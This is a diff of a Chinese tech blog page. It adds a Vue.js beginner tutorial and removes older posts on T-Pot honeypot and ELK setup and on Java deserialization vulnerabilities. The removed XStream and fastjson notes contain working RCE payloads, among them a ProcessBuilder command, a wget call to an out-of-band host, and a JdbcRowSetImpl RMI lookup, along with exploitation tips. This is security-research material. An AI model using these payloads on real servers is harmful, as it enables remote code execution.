-<h2 id="0x01-提取主控"><a href="#0x01-提取主控" class="headerlink" title="0x01 提取主控"></a>0x01 提取主控</h2><p>   为了提取主控中的ES和logstash以及其他可能比较喜欢的辅助工具，可以先在自己的本地起个虚拟机，安装标准版的tpot，即安装的时候选择standard，等待安装完毕。<br>  然后我们要做的就是完成安装后进到系统里，默认启动后会自动启动所有的docker实例。使用docker命令将我们需要的实例单独打包成镜像倒出来，我们最需要的目前是elasticsearch、kibana、logstash，如果还有其他需要的也可以倒出来。打包成镜像的命令为：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo docker commit xxxx:xxx //commit container to images</span><br><span class="line">sudo docker save xxxx &gt; xxx.tar //package the image to tar</span><br><span class="line">sudo docker inspect xxx //details of image or container</span><br></pre></td></tr></table></figure></p>
-<p>然后把打包好的tar包保存起来，放到需要成为主控的地方重新转成container：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker load -i xxx.tar //import images from tar</span><br></pre></td></tr></table></figure></p>
-<p>这里要注意的是es的容器其使用了虚拟机本地的data目录，建议把data目录里的数据一并考出去然后使移植过的es容器的data目录挂载到这个目录上，类似于：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker run -d -p 59200:9200 -v /mnt/nas/honeyportdata:/data:rw --name tpotes tpotes /usr/share/elasticsearch/bin/elasticsearch</span><br></pre></td></tr></table></figure></p>
-<p>PS：建议在迁移的时候关注一下这几个容器的详细信息，里面会写着端口映射、目录映射、执行命令等，通过docker inspect命令。</p>
-<h2 id="0x02-sensor和主控"><a href="#0x02-sensor和主控" class="headerlink" title="0x02 sensor和主控"></a>0x02 sensor和主控</h2><ol>
-<li>首先我们要先部署tpot，找一个可以支持自定义镜像上传的vps厂家，我使用的是vultr，虚拟机一定要选8G4核以上的配置，不然会出一堆问题。</li>
-<li>然后进入到安装界面就没什么好说的了，省去不说了，在VPS上我们选择安装模式的时候记得选sensor，因为我们只需要VPS上具备探测器功能即可。<ol start="3">
-<li>将之前分离出来的logstash镜像的tar包上传到sensor上，根据这个镜像起一个docker的容器实例。</li>
-<li>主控这边使用之前提取出来的es和kibana镜像在本地创建实例，然后将复制出来的es的data目录映射到容器的es里，起来即可<h2 id="0x03-打通主控与sensor之间的日志传递"><a href="#0x03-打通主控与sensor之间的日志传递" class="headerlink" title="0x03 打通主控与sensor之间的日志传递"></a>0x03 打通主控与sensor之间的日志传递</h2></li>
-<li>先来说说logstash，主要是负责收集sensor的日志并发送给es，直接通过docker exec进入到logstash容器中，修改其配置文件，将本地的es地址改为远程接收的地址，保存重启容器即可。</li>
-<li>再来看看es，建议es先加个密码认证，密码认证直接在es容器里使用es自己的命令，里面有个生成password命令，敲一下跟着流程走就好，记录下密码后记得在logstash里也配上密码。其次确保ES的端口对外暴露，安全起见可以防火墙限制IP访问。es和logstash两边都通，logstash能正常推送给es就会在本地看到数据了。</li>
-<li>如果ES在局域网内网，可能需要通过一些代理映射打通，如果通过花生壳之类的将ES映射到域名上，由于logstash不能配置域名，因此可以在sensor上在装个nginx进行反带处理，其他流程一致。</li>
-<li>另外由于sensor与es之间可能网络不太好，建议配置nginx反带的超时时间长一些，logstash也配置一下超时时间，太短了容易一直报错<h2 id="0x04-目前存在的疑惑"><a href="#0x04-目前存在的疑惑" class="headerlink" title="0x04 目前存在的疑惑"></a>0x04 目前存在的疑惑</h2>连续好几次挂了一晚上，sensor上的容器就全部丢失了，很奇怪没有查到原因。<h2 id="0x05-其他"><a href="#0x05-其他" class="headerlink" title="0x05 其他"></a>0x05 其他</h2>本文仅仅是一个思路的概括和一些坑的提示，具体ELK怎么操作和配置建议自行学习掌握，没那么复杂。</li>
-</ol>
+            <h2 id="0x00-学习vue的简单安装"><a href="#0x00-学习vue的简单安装" class="headerlink" title="0x00 学习vue的简单安装"></a>0x00 学习vue的简单安装</h2><p>下载vue代码在script标签中引入或者是引入cdn链接<a href="https://cdn.staticfile.org/vue/2.2.2/vue.min.js" target="_blank" rel="noopener">https://cdn.staticfile.org/vue/2.2.2/vue.min.js</a>即可完成安装</p>
+<h2 id="0x01-目录树"><a href="#0x01-目录树" class="headerlink" title="0x01 目录树"></a>0x01 目录树</h2><p>build    项目构建(webpack)相关代码<br>config    配置目录，包括端口号等。我们初学可以使用默认的。<br>node          modules    npm 加载的项目依赖模块<br>src    这里是我们要开发的目录，基本上要做的事情都在这个目录里。里面包含了几个目录及文件：</p>
+<ul>
+<li>assets: 放置一些图片，如logo等。</li>
+<li>components: 目录里面放了一个组件文件，可以不用。</li>
+<li>App.vue: 项目入口文件，我们也可以直接将组件写这里，而不使用 components 目录。</li>
+<li>main.js: 项目的核心文件。<br>static.  静态资源目录，如图片、字体等。<br>test    初始测试目录，可删除<br>.xxxx文件    这些是一些配置文件，包括语法配置，git配置等。<br>index.html    首页入口文件，你可以添加一些 meta 信息或统计代码啥的。<br>package.json    项目配置文件。<br>README.md    项目的说明文档，markdown 格式</li>
+</ul>
+<h2 id="0x02-简单的代码示例"><a href="#0x02-简单的代码示例" class="headerlink" title="0x02 简单的代码示例"></a>0x02 简单的代码示例</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"r1"</span>&gt;</span>修改颜色<span class="tag">&lt;/<span class="name">label</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"checkbox"</span> <span class="attr">v-model</span>=<span class="string">"use"</span> <span class="attr">id</span>=<span class="string">"r1"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">v-bind:class</span>=<span class="string">"&#123;'class1': use&#125;"</span>&gt;</span></span><br><span class="line">    v-bind:class 指令</span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">new Vue(&#123;</span></span><br><span class="line"><span class="undefined">    el: '#app',</span></span><br><span class="line"><span class="undefined">  data:&#123;</span></span><br><span class="line"><span class="undefined">      use: false</span></span><br><span class="line"><span class="undefined">  &#125;,</span></span><br><span class="line"><span class="undefined">  methods:&#123;</span></span><br><span class="line"><span class="undefined">	hello:function()&#123;&#125;</span></span><br><span class="line"><span class="undefined">  &#125;,</span></span><br><span class="line"><span class="undefined">  filters:&#123;</span></span><br><span class="line"><span class="undefined">	//过滤器，通过|符号调用，如 &#123;&#123; message | capitalize &#125;&#125;，可以串联可以接受参数</span></span><br><span class="line"><span class="undefined">    capitalize:function(value)&#123;&#125;</span></span><br><span class="line"><span class="undefined">  &#125;,</span></span><br><span class="line"><span class="undefined">  computed: &#123;</span></span><br><span class="line"><span class="undefined">    // 计算属性的 getter</span></span><br><span class="line"><span class="undefined">    reversedMessage: function () &#123;</span></span><br><span class="line"><span class="undefined">      // `this` 指向 vm 实例</span></span><br><span class="line"><span class="undefined">      return this.message.split('').reverse().join('')</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined">  &#125;,</span></span><br><span class="line"><span class="undefined">   watch:&#123;</span></span><br><span class="line"><span class="undefined">	//监听变量改变，函数名=需监听的变量名</span></span><br><span class="line"><span class="undefined">     use:function(val)&#123;</span></span><br><span class="line"><span class="undefined">	&#125;,</span></span><br><span class="line"><span class="undefined">   components: &#123;</span></span><br><span class="line"><span class="xml">    // <span class="tag">&lt;<span class="name">runoob</span>&gt;</span> 将只在父模板可用</span></span><br><span class="line"><span class="undefined">    'runoob': Child</span></span><br><span class="line"><span class="undefined">  &#125;</span></span><br><span class="line"><span class="undefined">  &#125;</span></span><br><span class="line"><span class="undefined">&#125;);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>实现单选框改变样式</p>
+<h2 id="0x03-一些指令作用的记录"><a href="#0x03-一些指令作用的记录" class="headerlink" title="0x03 一些指令作用的记录"></a>0x03 一些指令作用的记录</h2><p>注意：必须要带双引号</p>
+<ul>
+<li>v-html   用于插入html标签</li>
+<li>v-model  用户输入改变变量值</li>
+<li>v-bind  用于绑定属性的值，可以是变量或者表达式之类的<ul>
+<li>v-bind:class=“{‘class1’:var}” 通过var的true或false控制class的应用</li>
+<li>v-bind:href=“url”  通过控制url的值来改变其链接，等于:href=“url”</li>
+<li>v-biind:id=“‘a’+id”   通过js表达式改变值，等于:id=“‘a’+id”</li>
+<li>……</li>
+</ul>
 </li>
-</ol>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/08/13/ELK安装使用相关记录/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="JOJO">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/touxiang.png">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="少女的泪">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/08/13/ELK安装使用相关记录/" itemprop="url">ELK安装使用相关记录</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-08-13T02:21:30+08:00">
-                2019-08-13
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/大数据/" itemprop="url" rel="index">
-                    <span itemprop="name">大数据</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="0x00-ELK大概介绍"><a href="#0x00-ELK大概介绍" class="headerlink" title="0x00 ELK大概介绍"></a>0x00 ELK大概介绍</h2><p>ELK就是elastic search+logstash+kibana，然后logstash通常还要配上beats，简单的逻辑是：beats -> logstash->elastic search ->kibana</p>
-<ol>
-<li>beats是轻量型的数据采集装置，采集好数据后发送给logstash</li>
-<li>logstash就像是一个日志搜集管道，里面带了一些日志格式的过滤插件，最后整合成统一格式的数据发送给elasticsearch</li>
-<li>elasticsearch拿到数据后存起来就可以开始根据配置进行搜索了，提供了restful的接口</li>
-<li>kibana作为开源通用的界面帮助我们快速的利用elasticsearch进行搜索</li>
-</ol>
-<h2 id="0x01-ELK安装"><a href="#0x01-ELK安装" class="headerlink" title="0x01 ELK安装"></a>0x01 ELK安装</h2><p>Ubuntu为例，现在官方提供了一系列的安装方式，可以直接参照官方文档进行安装即可。这里使用的是apt的安装方式：</p>
-<ol>
-<li>sudo apt-get install apt-transport-https</li>
-<li>echo “deb <a href="https://artifacts.elastic.co/packages/7.x/apt" target="_blank" rel="noopener">https://artifacts.elastic.co/packages/7.x/apt</a> stable main” | sudo tee -a /etc/apt/sources.list.d/elastic-7.x.list</li>
-<li>sudo apt-get update &amp;&amp; sudo apt-get install elasticsearch logstash kibana</li>
-<li>beats的话要根据实际采集的数据格式去下载，比如mysql的话去下载mysqlbeats</li>
-</ol>
-<h2 id="0x02-配置密码认证"><a href="#0x02-配置密码认证" class="headerlink" title="0x02 配置密码认证"></a>0x02 配置密码认证</h2><ol>
-<li>elasticsearch上新版本已经集成了xpack，进入到bin目录下，使用<code>elasticsearch-setup-password interactive</code>来交互性的设置密码，并且将密码记录下来</li>
-<li>kibana中需要配置es的user和password选项，并且注意kibana的basepath</li>
-<li>logstash中在output的es配置中配置正确的hosts、user、password选项，注意logstash的hosts可以接受域名，但是域名和端口必须能用IP访问，为了解决这个问题可以使用nginx代理来代理一层</li>
-</ol>
-<h2 id="0x99-java环境"><a href="#0x99-java环境" class="headerlink" title="0x99 java环境"></a>0x99 java环境</h2><p>ELK依赖于Java环境，官方说最好建议使用oracle jdk8，oracle现在下载jdk需要登陆注册，因此直接手工去下载包解压缩后手工配置。</p>
-<ol>
-<li>创建java的目录：<code>mkdir /usr/lib/jvm</code></li>
-<li>下载并解压tar包：<code>sudo tar -zxvf /home/Downloads/jdk-8u221-linux-x64.tar.gz -C /usr/lib/jvm</code></li>
-<li>为了便于java版本管理，这里使用Linux包版本管理工具update-alternatives其本质是软连接的管理，因此我们直接将javahome做软连接</li>
-<li><code>sudo update-alternatives —install /usr/local/jdk jdk /usr/lib/jvm/jdk-8u22XXXXXX 300</code></li>
-<li>然后将该软连接的jdk目录写入到环境变量中作为javahome： <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#set oracle jdk environment</span><br><span class="line">export JAVA_HOME=/usr/local/jdk  ## 这里要注意目录要换成自己解压的jdk 目录</span><br><span class="line">export JRE_HOME=$&#123;JAVA_HOME&#125;/jre</span><br><span class="line">export CLASSPATH=.:$&#123;JAVA_HOME&#125;/lib:$&#123;JRE_HOME&#125;/lib</span><br><span class="line">export PATH=$&#123;JAVA_HOME&#125;/bin:$PATH</span><br></pre></td></tr></table></figure>
+<li>v-if=变量  根据变量的值进行判断是否应用</li>
+<li>v-show=”ok” 可以展示元素</li>
+<li>v-on:click=”reverseMessage”  类似于onclick的时候执行后面的函数，等于@click=”reverseMessage”<h2 id="0x04-条件语句"><a href="#0x04-条件语句" class="headerlink" title="0x04 条件语句"></a>0x04 条件语句</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">v-if</span>=<span class="string">"type === 'A'"</span>&gt;</span></span><br><span class="line">      A</span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">v-else-if</span>=<span class="string">"type === 'B'"</span>&gt;</span></span><br><span class="line">      B</span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">v-else-if</span>=<span class="string">"type === 'C'"</span>&gt;</span></span><br><span class="line">      C</span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">v-else</span>&gt;</span></span><br><span class="line">      Not A/B/C</span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">new Vue(&#123;</span></span><br><span class="line"><span class="undefined">  el: '#app',</span></span><br><span class="line"><span class="undefined">  data: &#123;</span></span><br><span class="line"><span class="undefined">    type: 'C'</span></span><br><span class="line"><span class="undefined">  &#125;</span></span><br><span class="line"><span class="undefined">&#125;)</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
 </li>
-</ol>
-<p>以后如果需要切换jdk版本，先通过install的方式注册jdk，然后通过命令：<br><code>update-alternatives —config jdk</code><br>来进行切换，install的时候后面的数字是优先级，在auto模式的时候有用默认根据数字大的优先作为版本使用</p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/25/xstream-1.4.10反序列化漏洞/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="JOJO">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/touxiang.png">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="少女的泪">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/07/25/xstream-1.4.10反序列化漏洞/" itemprop="url">xstream-1.4.10反序列化漏洞</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-07-25T02:21:30+08:00">
-                2019-07-25
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/web安全/" itemprop="url" rel="index">
-                    <span itemprop="name">web安全</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="0x00-CVE-2019-10173"><a href="#0x00-CVE-2019-10173" class="headerlink" title="0x00 CVE-2019-10173"></a>0x00 CVE-2019-10173</h2><p>参考<a href="http://x-stream.github.io/changes.html#1.4.11" target="_blank" rel="noopener">http://x-stream.github.io/changes.html#1.4.11</a></p>
-<h2 id="0x01-payload"><a href="#0x01-payload" class="headerlink" title="0x01 payload"></a>0x01 payload</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">sorted-set</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">string</span>&gt;</span>foo<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dynamic-proxy</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">interface</span>&gt;</span>java.lang.Comparable<span class="tag">&lt;/<span class="name">interface</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">handler</span> <span class="attr">class</span>=<span class="string">"java.beans.EventHandler"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">target</span> <span class="attr">class</span>=<span class="string">"java.lang.ProcessBuilder"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">command</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">string</span>&gt;</span>ping<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">string</span>&gt;</span>xxxxx<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">command</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">action</span>&gt;</span>start<span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">handler</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dynamic-proxy</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">sorted-set</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>可能的变形(似乎并不行)：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;"sorted-set":&#123;"string":"foo","dynamic-proxy":&#123;"interface":"java.lang.Comparable","handler":&#123;"class":"java.beans.EventHandler","target":&#123;"class":"java.lang.ProcessBuilder","command":["wget","http://2nmquk.ceye.io"]&#125;,"action":"start"&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure></p>
-<h2 id="0x02-说明"><a href="#0x02-说明" class="headerlink" title="0x02 说明"></a>0x02 说明</h2><p>XML的payload是没问题的，json这些是改的，不见得可以，主要问题在于那个XML属性不知道怎么对应到json格式，不过xstream的反序列化函数确实是支持json和XML同时传入的</p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/13/fastjson的RCE漏洞复现记录/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="JOJO">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/touxiang.png">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="少女的泪">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/07/13/fastjson的RCE漏洞复现记录/" itemprop="url">fastjson的RCE漏洞复现记录</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-07-13T12:21:30+08:00">
-                2019-07-13
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/web安全/" itemprop="url" rel="index">
-                    <span itemprop="name">web安全</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="0x00-关于fastjson"><a href="#0x00-关于fastjson" class="headerlink" title="0x00 关于fastjson"></a>0x00 关于fastjson</h2><p>反正是阿里巴巴的一个开源json库，java站都爱用，还有比如Jackson、gson什么的，Jackson也有RCE问题。fastjson主要几次问题都在于autotype，其实我也不太懂autotype，可能@type的形式就叫aotutype吧。<br>关于开关fastjson的autotype以及白名单配置<a href="https://github.com/alibaba/fastjson/wiki/enable_autotype" target="_blank" rel="noopener">https://github.com/alibaba/fastjson/wiki/enable_autotype</a></p>
-<h2 id="0x01-关于反序列化"><a href="#0x01-关于反序列化" class="headerlink" title="0x01 关于反序列化"></a>0x01 关于反序列化</h2><p>之前的autotype存在反序列化的问题，48版本后又多了个绕过autotype设置的问题，以至于不管你是否开启autotype，使用@type都可以触发反序列化，目前的修复方案好像也只是优化了黑名单，并没有从本质上解决这个问题。<br>目前出问题的是java.lang.Class可以构造出其他的反序列化利用链，而因为种种问题参考<a href="https://bithack.io/forum/393" target="_blank" rel="noopener">fastjson漏洞分析</a>，<a href="http://xz.aliyun.com/t/5680" target="_blank" rel="noopener">http://xz.aliyun.com/t/5680</a>可以绕过黑名单和autotypesuport的校验。</p>
-<h2 id="0x02-payload"><a href="#0x02-payload" class="headerlink" title="0x02 payload"></a>0x02 payload</h2><p><code>{&quot;name&quot;:{&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;},&quot;x&quot;:{&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://localhost:1099/Exploit&quot;,&quot;autoCommit&quot;:true}}}</code><br>本次利用的形式如上，后面的利用链可以更换成以前的其他类似的payload均可以，因此有很多种变种。<br>将下面这个github里的历史payload改造成上面这种就好了<a href="https://github.com/shengqi158/fastjson-remote-code-execute-poc" title="github历史payload" target="_blank" rel="noopener">github历史payload</a></p>
-<h2 id="0x03-一些利用"><a href="#0x03-一些利用" class="headerlink" title="0x03 一些利用"></a>0x03 一些利用</h2><p>利用的思路可以看看这个文章<a href="https://www.cnblogs.com/hac425/p/9800288.html" target="_blank" rel="noopener">fastjson利用总结</a>，思路是差不多的，具体payload参考上面那个github改一改，这文章里有个直接执行命令的利用方法可以关注一下（意思是不需要搭建rmi和ldap的那种）<br>新增：</p>
-<ol>
-<li>fastjson\&lt;1.2.58版本的新的利用链<a href="https://github.com/mikuKeeper/CVE-2019-12384" target="_blank" rel="noopener">https://github.com/mikuKeeper/CVE-2019-12384</a>该利用链同样适用于Jackson，不如说本来也就是Jackson那边爆出来的<h2 id="0x04-利用的时候一些重点注意事项"><a href="#0x04-利用的时候一些重点注意事项" class="headerlink" title="0x04 利用的时候一些重点注意事项"></a>0x04 利用的时候一些重点注意事项</h2></li>
-<li>利用的时候其实会受到目标使用的jdk版本影响，如果要绕过jdk版本的话需要利用的绕过方法也受到目标是否存在对应利用链的问题</li>
-<li>利用的时候ldap和rmi其实一定程度上是等价的，建议使用ldap</li>
-<li>利用的时候ldap能收到目标发送的请求但是没有通过reference请求到web服务获取exploit.class的原因就是前面说的jdk版本问题</li>
-<li>ldap收到了请求就可以认为目标存在fastjson漏洞，至于能不能饶过版本限制就是后面的事情了，可以根据这个特性做个批量检测工具</li>
-<li>关于版本饶过的详细总结可以看这个<a href="https://www.freebuf.com/column/207439.html" target="_blank" rel="noopener">饶过jdk版本限制</a></li>
-<li>貌似在未开启autotypesuport配置情况下，需要发两次请求触发缓存</li>
-<li>利用时候的exp本身也需要满足jdk版本要求，比较简单的做法是使用jdk6来生成exp</li>
-</ol>
-<h2 id="0x05关于测试环境"><a href="#0x05关于测试环境" class="headerlink" title="0x05关于测试环境"></a>0x05关于测试环境</h2><p>测试环境可以使用vulhub的fastjson环境，该环境目前已知有两个问题：</p>
-<ol>
-<li>centos7可能会出现docker build失败的问题，rm命令执行错误，换个ubuntu就好了</li>
